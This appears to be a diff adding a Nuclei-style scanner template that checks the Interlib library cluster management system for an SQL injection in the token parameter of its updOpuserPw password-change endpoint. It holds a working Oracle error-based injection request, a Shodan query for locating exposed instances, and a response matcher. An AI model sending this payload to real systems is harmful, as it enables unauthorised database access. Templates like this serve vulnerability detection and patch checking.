@@ -1,0 +1,30 @@
+id: Interlib_updOpuserPw_token_SQL_injection
+
+info:
+  name: Interlib_updOpuserPw_token_SQL_injection
+  author: HK
+  severity: high
+  description: Interlib library cluster management system updOpuserPw token SQL injection
+  metadata:
+    max-request: 1
+    shodan-query: body="interlib"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /interlib3/service/sysop/updOpuserPw?loginid=123&newpassword=123&token=1%27and+ctxsys.drithsx.sn(1,(select%201024*1024%20from%20dual))=%272 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Accept-Charset: utf-8
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - "1048576"
